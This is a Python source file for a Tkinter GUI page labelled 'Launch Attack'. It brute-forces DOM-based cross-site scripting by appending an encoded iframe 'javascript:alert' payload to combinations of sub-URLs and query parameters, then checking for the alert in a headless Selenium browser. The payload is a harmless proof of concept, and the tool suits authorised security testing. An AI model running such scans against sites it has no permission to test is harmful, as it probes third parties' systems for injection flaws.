import os
from tkinter import Frame, Label, Entry, Button, Text
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options
import threading

class DomXssPage(Frame):
    def __init__(self, parent, controller):
        Frame.__init__(self, parent)
        self.controller = controller

        Label(self, text="Login URL:").pack()
        self.url_entry = Entry(self)
        self.url_entry.pack()

        self.result_text = Text(self)
        self.result_text.pack()

        Button(self, text="Launch Attack", command=self.launch_attack).pack()

    def launch_attack(self):
        thread = threading.Thread(target=lambda: self.attack())
        thread.start()
    

    def attack(self):
        base_url = self.url_entry.get()

        # Get the directory of this script
        dir_path = os.path.dirname(os.path.realpath(__file__))

        # Construct the file path
        queryParameter_file_path = os.path.join(dir_path, '../ressources/queryParameter.txt')
        url_file_path = os.path.join(dir_path, '../ressources/url.txt')

        # Read the list of query Param from a file
        queryParameters = []
        with open(queryParameter_file_path, 'r') as f:
            queryParameters = [line.strip() for line in f]

        # Read the list of common url from a file
        urls = []
        with open(url_file_path, 'r') as f:
            urls = [line.strip() for line in f]

        javascript_executed = '<iframe%20src%3D"javascript:alert(%60xss%60)">'
        
        # Clear the result text
        self.result_text.delete('1.0', 'end')

        success_count = 0
        fail_count = 0

        for sub_url in urls:
            for queryParameter in queryParameters:
                # Créer une instance des options Chrome
                chrome_options = Options()
                chrome_options.add_argument('--headless')

                # Créer une instance du navigateur Chrome avec les options headless
                driver = webdriver.Chrome(options=chrome_options)

                driver.get(base_url + sub_url + queryParameter + javascript_executed)

                try:
                    # Wait for the alert to be present
                    WebDriverWait(driver, 10).until(EC.alert_is_present())

                    # Switch to the alert
                    alert = driver.switch_to.alert

                    # Verify the alert text
                    if alert.text == 'xss':
                        self.result_text.insert('end', f"Success with sub URL: {sub_url} and query parameters: {queryParameter}\n")
                        success_count += 1
                    else:
                        self.result_text.insert('end', f"Failed with sub URL: {sub_url} and query parameters: {queryParameter}\n")
                        fail_count += 1

                    # Accept the alert
                    alert.accept()
                except TimeoutException:
                    self.result_text.insert('end', f"No alert present with sub URL: {sub_url} and query parameters: {queryParameter}\n")
                    fail_count += 1

                driver.close()
            
        # Display the summary
        self.result_text.insert('end', f"\nSummary:\nSuccesses: {success_count}\nFailures: {fail_count}\n")
